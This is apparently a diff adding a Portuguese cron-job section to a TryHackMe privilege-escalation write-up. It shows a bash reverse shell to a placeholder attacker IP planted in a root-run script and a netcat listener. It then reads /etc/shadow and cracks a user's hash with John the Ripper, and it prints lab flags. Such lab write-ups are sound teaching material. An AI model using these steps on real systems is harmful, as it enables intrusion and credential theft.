@@ -718,3 +718,196 @@ THM-9349843
 6. **Flag obtida**: `THM-9349843`
 
 Este cenário demonstra como capabilities mal configuradas, especialmente `cap_setuid`, podem permitir que usuários não privilegiados executem operações que normalmente requerem privilégios de root, facilitando o acesso a arquivos restritos e escalonamento de privilégios.
+
+---
+## 7. Cron Jobs
+
+### Compreensão do Cron
+
+Cron é um agendador de tarefas em sistemas Unix/Linux que executa comandos ou scripts em intervalos programados. As tarefas são definidas no arquivo `/etc/crontab` ou em diretórios como `/etc/cron.d/`. Se um script agendado for gravável por um usuário não privilegiado, ele pode modificar o script para executar código malicioso quando o cron o executar com privilégios de root.
+
+### Verificação de Tarefas Agendadas
+
+Para visualizar todas as tarefas cron do sistema:
+
+```bash
+cat /etc/crontab
+```
+
+**Resultado:**
+
+```text
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * *  root /antivirus.sh
+* * * * *  root antivirus.sh
+* * * * *  root /home/karen/backup.sh
+* * * * *  root /tmp/test.py
+```
+
+**Análise da saída:**
+
+- As primeiras 4 linhas são comentários explicando o formato do cron
+- Linhas 17, 25, 47, 52: Tarefas padrão do sistema (execução a cada hora, diária, semanal, mensal)
+- **Linhas críticas**: 4 tarefas executadas a cada minuto (`* * * * *`) pelo usuário root
+- Scripts de interesse:
+    - `/antivirus.sh` (executa a cada minuto)
+    - `antivirus.sh` (caminho relativo - importante verificar onde está)
+    - `/home/karen/backup.sh` (no diretório home do usuário Karen)
+    - `/tmp/test.py` (script Python no diretório temporário)
+
+### Análise do Script de Backup
+
+```bash
+cat /home/karen/backup.sh
+```
+
+**Resultado:**
+
+```bash
+#!/bin/bash
+cd /home/admin/1/2/3/Results
+zip -r /home/admin/download.zip ./*
+```
+
+**Funcionamento do script:**
+
+- `cd /home/admin/1/2/3/Results`: Navega para o diretório de resultados
+- `zip -r /home/admin/download.zip ./*`: Compacta recursivamente todos os arquivos do diretório atual em `download.zip`
+
+**Ponto crítico:** O script `backup.sh` está no diretório home de Karen (`/home/karen/`) e é executado pelo root a cada minuto. Karen tem permissão de escrita em seu próprio diretório home, portanto pode modificar este script.
+
+### Exploração via Reverse Shell
+
+#### Modificação do Script
+
+```bash
+#!/bin/bash
+
+bash -i >& /dev/tcp/{IP_ATACANTE}/6666 0>&1
+```
+
+**Explicação do comando:**
+
+- `bash -i`: Inicia um shell interativo
+- `>&`: Redireciona tanto stdout quanto stderr
+- `/dev/tpc/{IP_ATACANTE}/6666`: Cria uma conexão TCP para o IP e porta especificados
+- `0>&1`: Redireciona stdin para o mesmo destino (torna o shell totalmente interativo)
+
+#### Configuração do listner
+
+Em outra janela de terminal (máquina do atacante):
+
+```bash
+nc -lvnp 6666
+```
+
+- `-l`: Modo listener (escuta)
+- `-v`: Verboso (mostra detalhes)
+- `-n`: Não resolve nomes DNS
+- `-p 6666`: Porta 6666
+
+#### Permissão de execução
+
+```bash
+chmod +x backup.sh
+```
+
+**Por que isso é necessário:** Scripts executados pelo cron precisam ter permissão de execução. Como Karen modificou o script, ela deve garantir que ele seja executável.
+
+### Obtenção do Shell Root
+
+Após um minuto (quando o cron executar o script), o netcat receberá uma conexão.
+
+**Saída Esperada:**
+
+```text
+listening on [any] 6666 ...
+connect to [10.10.10.10] from (UNKNOWN) [10.10.10.11] 54321
+bash: cannot set terminal process group (1234): Inappropriate ioctl for device
+bash: no job control in this shell
+root@target:~#
+```
+
+Verificando o usuário
+
+```bash
+whoami
+```
+
+**Resultado:**
+
+```text
+root
+```
+
+### Leitura da Flag 5
+
+Com acesso root:
+
+```bash
+cd home/ubuntu
+cat flag5.txt
+```
+
+**Resultado:**
+
+```text
+THM-383000283
+```
+
+### Coleta de Hashes de Senhas
+
+#### Leitura do `/etc/shadow`
+
+```bash
+cat /etc/shadow
+```
+
+**Resultado relevante:**
+
+```text
+matt:$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.
+```
+
+#### Preparação do hash para quebra
+
+```bash
+echo 'matt:$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.' > hash.txt
+```
+
+#### Quebra com John the Ripper
+
+
+```bash
+john --format=crypt --wordlist=rockyou.txt hash.txt
+```
+
+**Resultado:**
+
+```text
+matt:123456
+```
+
+### Resumo da Exploração
+
+1. **Enumeração**: Verificar `/etc/crontab` para encontrar tarefas agendadas por root
+2. **Identificação**: Localizar script `/home/karen/backup.sh` executado a cada minuto
+3. **Análise de permissões**: Karen tem acesso de escrita ao script (está em seu diretório home)
+4. **Modificação**: Alterar script para executar reverse shell
+5. **Listener**: Configurar netcat para receber conexão
+6. **Execução**: Aguardar o cron executar o script (1 minuto)
+7. **Acesso root**: Receber shell com privilégios de root
+8. **Pós-exploração**: Capturar flag (`THM-383000283`) e coletar hash do usuário matt para quebra
+
+---
